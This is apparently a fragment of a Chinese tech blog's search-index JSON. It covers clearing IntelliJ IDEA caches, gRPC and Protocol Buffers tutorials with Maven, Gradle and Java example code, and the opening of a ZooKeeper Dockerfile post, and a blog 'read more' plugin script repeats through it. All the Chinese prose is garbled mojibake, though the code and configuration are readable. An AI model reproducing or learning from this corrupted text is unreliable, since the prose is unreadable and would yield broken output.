çš„ç¼“å­˜å’Œç´¢å¼•æ–‡ä»¶ä¹Ÿæ˜¯ä¼šæŸåçš„ï¼Œæ¯”å¦‚ï¼šæ–­ç”µã€è“å±å¼•èµ·çš„å¼ºåˆ¶å…³æœºï¼Œå½“é‡æ–°å¯åŠ¨ IntelliJ IDEAï¼Œå¾ˆå¯èƒ½ IntelliJ IDEA ä¼šæŠ¥å„ç§è«åå…¶å¦™é”™è¯¯ï¼Œç”šè‡³é¡¹ç›®æ‰“ä¸å¼€ï¼ŒIntelliJ IDEA ä¸»é¢˜è¿˜åŸæˆé»˜è®¤çŠ¶æ€ã€‚å³ä½¿æ²¡æœ‰æ–­ç”µã€è“å±çš„æƒ…å†µå‘ç”Ÿï¼Œä¹Ÿä¼šæœ‰è«åå¥‡æ€ªçš„é—®é¢˜çš„æ—¶å€™ï¼Œä¹Ÿå¾ˆæœ‰å¯èƒ½æ˜¯ IntelliJ IDEA ç¼“å­˜å’Œç´¢å¼•å‡ºç°äº†é—®é¢˜ï¼Œè¿™ç§æƒ…å†µè¿˜ä¸å°‘ï¼Œé‡åˆ°æ­¤ç±»é—®é¢˜å¯ä»¥å°è¯•æ¸…ç†ç¼“å­˜å’Œç´¢å¼•ã€‚ ä¸€èˆ¬å»ºè®®ç‚¹å‡» â€œInvalidate and Restartâ€ï¼Œè¿™æ ·ä¼šæ¸…ç†å¾—æ¯”è¾ƒå¹²å‡€ã€‚ æ¸…é™¤ç´¢å¼•å’Œç¼“å­˜ä¼šä½¿å¾— IntelliJ IDEA çš„ Local History ä¸¢å¤±ï¼Œæ‰€ä»¥å¦‚æœé¡¹ç›®æ²¡æœ‰åŠ å…¥åˆ°ç‰ˆæœ¬æ§åˆ¶ï¼Œè€Œåˆéœ€è¦ä¿ç•™é¡¹ç›®æ–‡ä»¶çš„å†å²ç‰ˆæœ¬è®°å½•ï¼Œé‚£æœ€å¥½å¤‡ä»½ä¸‹ LocalHistory ç›®å½•ï¼Œè¯¥ç›®å½•ä½ç½®åœ¨: ï½/.IntelliJIdea14/system/LocalHistoryã€‚ é€šè¿‡ä¸Šé¢çš„æ–¹å¼æ¸…é™¤ç¼“å­˜ä¸ç´¢å¼•ï¼Œæœ¬è´¨ä¹Ÿå°±æ˜¯å»åˆ é™¤ system ç›®å½•ä¸‹å¯¹åº”çš„æ–‡ä»¶è€Œå·²ï¼Œæ‰€ä»¥å¦‚æœä¸ç”¨ä¸Šè¿°æ–¹æ³•ä¹Ÿå¯ä»¥å…ˆå…³é—­ IntelliJ IDEAï¼Œç„¶åç›´æ¥åˆ é™¤æ•´ä¸ª system ç›®å½•ã€‚å½“ IntelliJ IDEA é‡å¯çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨é‡æ–°åˆ›å»ºæ–°çš„ system ç›®å½•ä»¥åŠé¡¹ç›®å¯¹åº”çš„ç¼“å­˜å’Œç´¢å¼•ã€‚ IntelliJ IDEA çš„ Database åŠŸèƒ½ é…ç½® Database å°±æ˜¯ä¸ºäº†æœ‰ä¸€ä¸ª GUI ç®¡ç†æ•°æ®åº“åŠŸèƒ½ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯ IntelliJ IDEA çš„ Database æœ€é‡è¦ç‰¹æ€§ã€‚æ•°æ®åº“çš„ GUI å·¥å…·æœ‰å¾ˆå¤šï¼ŒIntelliJ IDEA çš„ Database ä¹Ÿæ²¡æœ‰å¤ªæ˜æ˜¾çš„ä¼˜åŠ¿ã€‚Database æœ€å¤§çš„ç‰¹æ€§å°±æ˜¯é’ˆå¯¹ Java Web é¡¹ç›®ç»å¸¸ä½¿ç”¨çš„ ORM æ¡†æ¶ï¼Œå¦‚ Hibernateã€Mybatis æœ‰å¾ˆå¥½çš„æ”¯æŒï¼Œæ¯”å¦‚é…ç½®å¥½äº† Database ä¹‹åï¼ŒIntelliJ IDEA ä¼šè‡ªåŠ¨è¯†åˆ« Domain å¯¹è±¡ä¸æ•°æ®è¡¨çš„å…³ç³»ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ Database çš„æ•°æ®è¡¨ç›´æ¥ç”Ÿæˆ Domain å¯¹è±¡ç­‰ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"gRPC åŸºç¡€æ•™ç¨‹ä¹‹äºŒ",url:"/posts/f534d182.html",text:'SpringBoot æ•´åˆ gRPC Gitee Demo ä»£ç  grpc-spring-boot-starter github grpc-spring-boot-starter ä¸­æ–‡æ–‡æ¡£ gRPC çš„å››ç§æœåŠ¡ç±»å‹å®šä¹‰ ä¸€ä¸ªç®€å• RPCï¼Œå®¢æˆ·ç«¯ä½¿ç”¨å­˜æ ¹å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨å¹¶ç­‰å¾…å“åº”è¿”å›ï¼Œå°±åƒå¹³å¸¸çš„å‡½æ•°è°ƒç”¨ä¸€æ ·ã€‚ 1rpc GetFeature(Point) returns (Feature) {} ä¸€ä¸ªæœåŠ¡å™¨ç«¯æµå¼ RPCï¼Œå®¢æˆ·ç«¯å‘é€è¯·æ±‚åˆ°æœåŠ¡å™¨ï¼Œæ‹¿åˆ°ä¸€ä¸ªæµå»è¯»å–è¿”å›çš„æ¶ˆæ¯åºåˆ—ã€‚å®¢æˆ·ç«¯è¯»å–è¿”å›çš„æµï¼Œç›´åˆ°é‡Œé¢æ²¡æœ‰ä»»ä½•æ¶ˆæ¯ã€‚é€šè¿‡åœ¨å“åº”ç±»å‹å‰æ’å…¥ stream å…³é”®å­—ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªæœåŠ¡å™¨ç«¯çš„æµæ–¹æ³•ã€‚ 1rpc ListFeatures(Rectangle) returns (stream Feature) {} ä¸€ä¸ª å®¢æˆ·ç«¯æµå¼ RPCï¼Œå®¢æˆ·ç«¯å†™å…¥ä¸€ä¸ªæ¶ˆæ¯åºåˆ—å¹¶å°†å…¶å‘é€åˆ°æœåŠ¡å™¨ï¼ŒåŒæ ·ä¹Ÿæ˜¯ä½¿ç”¨æµã€‚ä¸€æ—¦å®¢æˆ·ç«¯å®Œæˆå†™å…¥æ¶ˆæ¯ï¼Œå®ƒç­‰å¾…æœåŠ¡å™¨å®Œæˆè¯»å–è¿”å›å®ƒçš„å“åº”ã€‚é€šè¿‡åœ¨è¯·æ±‚ç±»å‹å‰æŒ‡å®š stream å…³é”®å­—æ¥æŒ‡å®šä¸€ä¸ªå®¢æˆ·ç«¯çš„æµæ–¹æ³•ã€‚ 1rpc RecordRoute(stream Point) returns (RouteSummary) {} ä¸€ä¸ªåŒå‘æµå¼ RPC æ˜¯åŒæ–¹ä½¿ç”¨è¯»å†™æµå»å‘é€ä¸€ä¸ªæ¶ˆæ¯åºåˆ—ã€‚ä¸¤ä¸ªæµç‹¬ç«‹æ“ä½œï¼Œå› æ­¤å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥ä»¥ä»»æ„å–œæ¬¢çš„é¡ºåºè¯»å†™ï¼šæ¯”å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥åœ¨å†™å…¥å“åº”å‰ç­‰å¾…æ¥æ”¶æ‰€æœ‰çš„å®¢æˆ·ç«¯æ¶ˆæ¯ï¼Œæˆ–è€…å¯ä»¥äº¤æ›¿åœ°è¯»å–å’Œå†™å…¥æ¶ˆæ¯ï¼Œæˆ–è€…å…¶ä»–è¯»å†™çš„ç»„åˆï¼Œæ¯ä¸ªæµä¸­çš„æ¶ˆæ¯é¡ºåºéƒ½ä¼šè¢«é¢„ç•™ã€‚é€šè¿‡åœ¨è¯·æ±‚å’Œå“åº”å‰åŠ  stream å…³é”®å­—å»åˆ¶å®šæ–¹æ³•çš„ç±»å‹ã€‚ 1rpc RouteChat(stream RouteNote) returns (stream RouteNote) {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"gRPC åŸºç¡€æ•™ç¨‹ä¹‹ä¸€",url:"/posts/ceb4ff2b.html",text:'å‰è¨€ æœ¬æ–‡å°†ä»‹ç» gRPCã€Protocol Buffers çš„æ¦‚å¿µï¼ŒåŒæ—¶ä¼šç»™å‡º Protocol Buffers ä»£ç ç”Ÿæˆå™¨çš„ä½¿ç”¨æ•™ç¨‹ï¼Œè¿˜æœ‰ç¼–å†™ç¬¬ä¸€ä¸ªåŸºäº gRPC çš„æœåŠ¡æä¾›è€…ä¸æœåŠ¡æ¶ˆè´¹è€…çš„ç¤ºä¾‹ç¨‹åºã€‚ ç›¸å…³ç«™ç‚¹ gRPC Github gRPC è‹±æ–‡æ–‡æ¡£ gRPC ä¸­æ–‡æ–‡æ¡£ gRPC-Java Github gRPC-Java ç¤ºä¾‹ä»£ç  Protocol Buffers å®˜ç½‘ Protocol Buffers Github Protocol Buffers è‹±æ–‡æ–‡æ¡£ gRPC ç®€ä»‹ gRPC æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ã€å¼€æºå’Œé€šç”¨çš„ RPC æ¡†æ¶ï¼Œé¢å‘ç§»åŠ¨å’Œ HTTP/2 è®¾è®¡ã€‚ç›®å‰æä¾› Cã€Javaã€Go è¯­è¨€ç‰ˆæœ¬ï¼Œåˆ†åˆ«æ˜¯ï¼šgrpcã€grpc-javaã€grpc-goï¼Œå…¶ä¸­ C ç‰ˆæœ¬æ”¯æŒ Cã€C++ã€Node.jsã€Pythonã€Rubyã€Objective-Cã€PHPã€C#ã€‚gRPC åŸºäº HTTP/2 æ ‡å‡†è®¾è®¡ï¼Œå¸¦æ¥è¯¸å¦‚åŒå‘æµã€æµæ§ã€å¤´éƒ¨å‹ç¼©ã€å• TCP è¿æ¥ä¸Šçš„å¤šå¤ç”¨è¯·æ±‚ç­‰ç‰¹æ€§ã€‚åœ¨ gRPC é‡Œå®¢æˆ·ç«¯åº”ç”¨å¯ä»¥åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·ç›´æ¥è°ƒç”¨å¦ä¸€å°ä¸åŒçš„æœºå™¨ä¸ŠæœåŠ¡ç«¯åº”ç”¨çš„æ–¹æ³•ï¼Œæ›´å®¹æ˜“åœ°åˆ›å»ºåˆ†å¸ƒå¼åº”ç”¨å’ŒæœåŠ¡ã€‚ä¸è®¸å¤š RPC ç³»ç»Ÿç±»ä¼¼ï¼ŒgRPC ä¹Ÿæ˜¯åŸºäºä»¥ä¸‹ç†å¿µï¼šå®šä¹‰ä¸€ä¸ªæœåŠ¡ï¼ŒæŒ‡å®šå…¶èƒ½å¤Ÿè¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•ï¼ˆåŒ…å«å‚æ•°å’Œè¿”å›ç±»å‹ï¼‰ã€‚åœ¨æœåŠ¡ç«¯å®ç°è¿™ä¸ªæ¥å£ï¼Œå¹¶è¿è¡Œä¸€ä¸ª gRPC æœåŠ¡å™¨æ¥å¤„ç†å®¢æˆ·ç«¯è°ƒç”¨ã€‚åœ¨å®¢æˆ·ç«¯æ‹¥æœ‰ä¸€ä¸ªå­˜æ ¹èƒ½å¤ŸåƒæœåŠ¡ç«¯ä¸€æ ·çš„æ–¹æ³•ã€‚å€¼å¾—è¯´æ˜çš„æ˜¯ï¼ŒgRPC å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å¯ä»¥åœ¨å¤šç§ç¯å¢ƒä¸­è¿è¡Œå’Œäº¤äº’ï¼Œæ”¯æŒç”¨ä»»ä½• gRPC æ”¯æŒçš„è¯­è¨€æ¥ç¼–å†™ï¼Œæ‰€ä»¥å¯ä»¥å¾ˆå®¹æ˜“åœ°ç”¨ Java åˆ›å»ºä¸€ä¸ª gRPC æœåŠ¡ç«¯ï¼Œç”¨ Goã€Pythonã€Ruby æ¥åˆ›å»ºå®¢æˆ·ç«¯ã€‚ ä½¿ç”¨ Protocol Buffers gRPC é»˜è®¤ä½¿ç”¨ Protocol Buffersï¼Œè¿™æ˜¯ Google å¼€æºçš„ä¸€å¥—æˆç†Ÿçš„ç»“æ„æ•°æ®åºåˆ—åŒ–æœºåˆ¶ï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–æ•°æ®æ ¼å¼å¦‚ JSONï¼‰ã€‚å½“ä½¿ç”¨ proto files åˆ›å»º gRPC æœåŠ¡ï¼Œç”¨ Protocol Buffers æ¶ˆæ¯ç±»å‹æ¥å®šä¹‰æ–¹æ³•å‚æ•°å’Œè¿”å›ç±»å‹ã€‚å°½ç®¡ Protocol Buffers å·²ç»å­˜åœ¨äº†ä¸€æ®µæ—¶é—´ï¼Œå®˜æ–¹çš„ç¤ºä¾‹ä»£ç ç§ä½¿ç”¨äº†ä¸€ç§åå« proto3 çš„æ–°é£æ ¼çš„ Protocol Buffersï¼Œå®ƒæ‹¥æœ‰è½»é‡ç®€åŒ–çš„è¯­æ³•ã€ä¸€äº›æœ‰ç”¨çš„æ–°åŠŸèƒ½ï¼Œå¹¶ä¸”æ”¯æŒæ›´å¤šæ–°è¯­è¨€ã€‚å½“å‰é’ˆå¯¹ Java å’Œ C++ å‘å¸ƒäº† beta ç‰ˆæœ¬ï¼Œé’ˆå¯¹ JavaNanoï¼ˆå³ Android Javaï¼‰å‘å¸ƒ alpha ç‰ˆæœ¬ï¼Œåœ¨ Protocol Buffers Github æºç åº“é‡Œæœ‰ Ruby æ”¯æŒï¼Œ åœ¨ Github æºç åº“é‡Œè¿˜æœ‰é’ˆå¯¹ Go è¯­è¨€çš„ç”Ÿæˆå™¨ï¼Œ å¯¹æ›´å¤šè¯­è¨€çš„æ”¯æŒæ­£åœ¨å¼€å‘ä¸­ã€‚è™½ç„¶å¯ä»¥ä½¿ç”¨ proto2 (å½“å‰é»˜è®¤çš„ Protocol Buffers ç‰ˆæœ¬)ï¼Œ é€šå¸¸å»ºè®®åœ¨ gRPC é‡Œä½¿ç”¨ proto3ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥ä½¿ç”¨ gRPC æ”¯æŒå…¨éƒ¨èŒƒå›´çš„çš„è¯­è¨€ï¼Œå¹¶ä¸”èƒ½é¿å… proto2 å®¢æˆ·ç«¯ä¸ proto3 æœåŠ¡ç«¯äº¤äº’æ—¶å‡ºç°çš„å…¼å®¹æ€§é—®é¢˜ï¼Œåä¹‹äº¦ç„¶ã€‚ æœ¬åœ°ç¼–è¯‘å®‰è£… Protocol Buffersï¼ˆå¯é€‰ï¼‰ å‚è€ƒè‡ª gRPC-Javaã€Protobuf ç¼–è¯‘æ„å»ºçš„å®˜æ–¹æ•™ç¨‹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦æ„å»º gRPC-Javaï¼Œåªæœ‰åœ¨å¯¹ gRPC-Java çš„æºç è¿›è¡Œäº†æ›´æ”¹æˆ–æµ‹è¯•ä½¿ç”¨ gRPC-Java åº“çš„éå‘å¸ƒç‰ˆæœ¬ï¼ˆä¾‹å¦‚ master åˆ†æ”¯ï¼‰æ—¶æ‰éœ€è¦æ„å»ºã€‚è‹¥æœ¬åœ°å®‰è£…äº† Protobufï¼Œåˆ™å¯ä»¥ç›´æ¥é€šè¿‡å‘½ä»¤çš„æ–¹å¼è°ƒç”¨ Protobuf çš„ä»£ç ç”Ÿæˆå™¨ï¼Œæ— éœ€å†ä¾èµ–é¢å¤–çš„ IDE æ’ä»¶ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738# ç³»ç»Ÿç¯å¢ƒCentOS Linux release 7.6.1810 (Core)Linux develop 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux# æ‹‰å–æºç # git clone https://github.com/google/protobuf.git# è¿›å…¥æºç ç›®å½•# cd protobuf# åˆ‡æ¢è‡³éœ€è¦ç¼–è¯‘çš„ç‰ˆæœ¬çš„åˆ†æ”¯# git checkout v3.7.1# æŸ¥çœ‹å½“å‰æ‰€åœ¨çš„åˆ†æ”¯ä¿¡æ¯# git branch -v# æ£€æµ‹å®‰è£…ç¯å¢ƒ# ./autogen.sh# ./configure --disable-shared# ç¼–è¯‘å®‰è£…# make -j 8# make install# å¦‚æœ/usr/local/libä¸åœ¨åº“æœç´¢è·¯å¾„ä¸­ï¼Œå¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ·»åŠ # sh -c \'echo /usr/local/lib &gt;&gt; /etc/ld.so.conf\'# ä½¿æ·»åŠ çš„åº“æœç´¢è·¯å¾„ç”Ÿæ•ˆ# ldconfig# æŸ¥çœ‹protobufå®‰è£…çš„ç‰ˆæœ¬å·# protoc --version# ç¼–å†™.protoæ–‡ä»¶ï¼Œä½¿ç”¨protobufçš„ä»£ç ç”Ÿæˆå™¨è‡ªåŠ¨ç”ŸæˆJavaä»£ç ï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹# protoc -I=$SRC_DIR --java_out=$DST_DIR $SRC_DIR/addressbook.proto# é»˜è®¤å®‰è£…è·¯å¾„ï¼š/usr/local# æŒ‡å®šå®‰è£…ç›®å½•å¯ä»¥ä½¿ç”¨æ­¤å‘½ä»¤ï¼š ./configure --disable-shared --prefix=/usr/local/protobuf-3.7.1 Eclipse é¡¹ç›®ä¸­æ·»åŠ  Protobuf è‡ªåŠ¨ç”Ÿæˆä»£ç çš„ Maven æ’ä»¶ä¸ Protobuf ä¾èµ– Protobuf çš„åŸå‹æ–‡ä»¶å’Œä¸€äº›é€‚åˆçš„æ’ä»¶ï¼Œé»˜è®¤æ”¾åœ¨ src/main/proto å’Œ src/test/proto ç›®å½•ä¸­ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-netty-shaded&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-protobuf&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-stub&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;build&gt; &lt;extensions&gt; &lt;extension&gt; &lt;groupId&gt;kr.motd.maven&lt;/groupId&gt; &lt;artifactId&gt;os-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.0.Final&lt;/version&gt; &lt;/extension&gt; &lt;/extensions&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.xolstice.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;protobuf-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.5.1&lt;/version&gt; &lt;configuration&gt; &lt;protocArtifact&gt;com.google.protobuf:protoc:3.7.1:exe:${os.detected.classifier}&lt;/protocArtifact&gt; &lt;pluginId&gt;grpc-java&lt;/pluginId&gt; &lt;pluginArtifact&gt;io.grpc:protoc-gen-grpc-java:1.21.0:exe:${os.detected.classifier}&lt;/pluginArtifact&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;compile&lt;/goal&gt; &lt;goal&gt;compile-custom&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; å¾€ Gradle æ„å»ºçš„é¡¹ç›®æ·»åŠ  Protobuf è‡ªåŠ¨ç”Ÿæˆä»£ç çš„æ’ä»¶ä¸ Protobuf ä¾èµ– 1234567891011121314151617181920212223242526plugins { id \'com.google.protobuf\' version \'0.8.8\'}protobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc {} } }}dependencies { compile \'io.grpc:grpc-stub:1.21.0\' compile \'io.grpc:grpc-protobuf:1.21.0\' compile \'io.grpc:grpc-netty-shaded:1.21.0\' testCompile group: \'junit\', name: \'junit\', version: \'4.12\'} ç¼–å†™ Proto æ–‡ä»¶ï¼ˆå®šä¹‰æœåŠ¡ï¼‰ï¼Œæ‰§è¡Œç¼–è¯‘åè‡ªåŠ¨ç”Ÿæˆ Java æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# åˆ›å»ºgradleå·¥ç¨‹grpc-demo-providerï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ï¼šgrpc-demo-provider/â”œâ”€â”€ build.gradleâ””â”€â”€ src â”œâ”€â”€ main â”‚&nbsp;&nbsp; â”œâ”€â”€ java â”‚&nbsp;&nbsp; â”œâ”€â”€ proto â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ helloworld.proto â”‚&nbsp;&nbsp; â””â”€â”€ resources â””â”€â”€ test â”œâ”€â”€ java â”œâ”€â”€ proto â””â”€â”€ resources# è¿›å…¥å·¥ç¨‹ç›®å½•# cd grpc-demo-provider# ç¼–è¾‘build.gradleæ–‡ä»¶ï¼Œæ·»åŠ protobufæ’ä»¶ä¸ä¾èµ–ï¼Œå¯å‚è€ƒä¸Šé¢ç»™å‡ºçš„gradleé…ç½®å†…å®¹# åˆ›å»ºprotoæ–‡ä»¶# mkdir -p src/main/proto# vim src/main/proto/helloworld.protosyntax = "proto3";option java_multiple_files = true;option java_package = "com.grpc.demo.generate";option java_outer_classname = "HelloWorldProto";option objc_class_prefix = "HLW";package helloworld;service Greeter { rpc SayHello (HelloRequest) returns (HelloReply) {}}message HelloRequest { string name = 1;}message HelloReply { string message = 1;}# æ‰§è¡Œç¼–è¯‘ï¼Œè‡ªåŠ¨ç”ŸæˆJavaæ–‡ä»¶# gradle clean build# æŸ¥çœ‹è‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶ç›®å½•ç»“æ„ï¼Œé»˜è®¤ç”Ÿæˆæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•æ˜¯ï¼š$buildDir/generated/source/protoï¼Œå…¶ä¸­Messageåœ¨main/javaç›®å½•ä¸‹ï¼ŒServiceåœ¨ç›®å½•main/grpcä¸‹# tree build/generated/source/protomainâ”œâ”€â”€ grpcâ”‚&nbsp;&nbsp; â””â”€â”€ comâ”‚&nbsp;&nbsp; â””â”€â”€ grpcâ”‚&nbsp;&nbsp; â””â”€â”€ demoâ”‚&nbsp;&nbsp; â””â”€â”€ generateâ”‚&nbsp;&nbsp; â””â”€â”€ GreeterGrpc.javaâ””â”€â”€ java â””â”€â”€ com â””â”€â”€ grpc â””â”€â”€ demo â””â”€â”€ generate â”œâ”€â”€ HelloReply.java â”œâ”€â”€ HelloReplyOrBuilder.java â”œâ”€â”€ HelloRequest.java â”œâ”€â”€ HelloRequestOrBuilder.java â””â”€â”€ HelloWorldProto.java Gradle æŒ‡å®š Protobuf ä»£ç è‡ªåŠ¨ç”Ÿæˆçš„ç›®å½•ä½ç½® 1234567891011121314151617181920212223242526272829303132333435// æŒ‡å®šMessageä»£ç çš„ç”Ÿæˆä½ç½®ï¼Œæœ€ç»ˆç”Ÿæˆä½ç½®åœ¨src/main/javaç›®å½•ä¸‹protobuf { generatedFilesBaseDir = "src"}// æŒ‡å®šServiceä»£ç çš„ç”Ÿæˆä½ç½®ï¼Œæœ€ç»ˆç”Ÿæˆä½ç½®åœ¨src/main/javaç›®å½•ä¸‹protobuf { generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } }}// å®Œæ•´çš„å†™æ³•ï¼ŒåŒæ—¶æŒ‡å®šMessageã€Serviceä»£ç ç”Ÿæˆçš„ç›®å½•ä½ç½®ä¸ºsrc/main/javaprotobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } } generatedFilesBaseDir = \'src\'} RPC æœåŠ¡æä¾›è€…çš„å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566package com.grpc.demo.provider.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.Server;import io.grpc.ServerBuilder;import io.grpc.stub.StreamObserver;import java.io.IOException;import java.util.logging.Logger;public class HelloWorldProvider { private Server server; private static final Logger logger = Logger.getLogger(HelloWorldProvider.class.getName()); private void start() throws IOException { int port = 50051; server = ServerBuilder.forPort(port) .addService(new GreeterImpl()) .build() .start(); logger.info("==&gt; Server started, listening on " + port); Runtime.getRuntime().addShutdownHook(new Thread() { @Override public void run() { System.err.println("*** shutting down gRPC server since JVM is shutting down"); HelloWorldProvider.this.stop(); System.err.println("*** server shut down"); } }); } private void stop() { if (server != null) { server.shutdown(); } } /** * Await termination on the main thread since the grpc library uses daemon threads. */ private void blockUntilShutdown() throws InterruptedException { if (server != null) { server.awaitTermination(); } } public static void main(String[] args) throws IOException, InterruptedException { final HelloWorldProvider server = new HelloWorldProvider(); server.start(); server.blockUntilShutdown(); } static class GreeterImpl extends GreeterGrpc.GreeterImplBase { @Override public void sayHello(HelloRequest req, StreamObserver&lt;HelloReply&gt; responseObserver) { HelloReply reply = HelloReply.newBuilder().setMessage("Hello " + req.getName()).build(); responseObserver.onNext(reply); responseObserver.onCompleted(); } }} RPC æœåŠ¡æ¶ˆè´¹è€…çš„å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.grpc.demo.consumer.service;import com.grpc.demo.generate.GreeterGrpc;import com.grpc.demo.generate.HelloReply;import com.grpc.demo.generate.HelloRequest;import io.grpc.ManagedChannel;import io.grpc.ManagedChannelBuilder;import io.grpc.StatusRuntimeException;import java.util.concurrent.TimeUnit;import java.util.logging.Level;import java.util.logging.Logger;public class HelloWorldConsumer { private final ManagedChannel channel; private final GreeterGrpc.GreeterBlockingStub blockingStub; private static final Logger logger = Logger.getLogger(HelloWorldConsumer.class.getName()); public HelloWorldConsumer(String host, int port) { this(ManagedChannelBuilder.forAddress(host, port) .usePlaintext() .build()); } HelloWorldConsumer(ManagedChannel channel) { this.channel = channel; blockingStub = GreeterGrpc.newBlockingStub(channel); } public void shutdown() throws InterruptedException { channel.shutdown().awaitTermination(5, TimeUnit.SECONDS); } public void greet(String name) { logger.info("==&gt; Will try to greet " + name + " ..."); HelloRequest request = HelloRequest.newBuilder().setName(name).build(); HelloReply response; try { response = blockingStub.sayHello(request); } catch (StatusRuntimeException e) { logger.log(Level.WARNING, "RPC failed: {0}", e.getStatus()); return; } logger.info("==&gt; Greeting: " + response.getMessage()); } public static void main(String[] args) throws Exception { HelloWorldConsumer client = new HelloWorldConsumer("localhost", 50051); try { String user = "World"; client.greet(user); } finally { client.shutdown(); } }} å…ˆåå¯åŠ¨ Providerã€Consumer åº”ç”¨ï¼Œæœ€ç»ˆè¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹å›¾æ‰€ç¤º Provider åº”ç”¨çš„æ—¥å¿—ä¿¡æ¯ï¼š Consumer åº”ç”¨çš„æ—¥å¿—ä¿¡æ¯ï¼š var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"ç¼–å†™ DockerFile æ„å»º ZooKeeper é•œåƒ",url:"/posts/b683a4df.html",text:'ä¸‹è½½è½¯ä»¶å‹ç¼©åŒ…12â”œâ”€â”€ jdk-8u201-linux-x64.tar.gzâ””â”€â”€ apache-zookeeper-3.5.5.tar.gz ç¼–å†™ DockerFile æ–‡ä»¶123456789101112131415161718192021222324252627282930FROM centosMAINTAINER 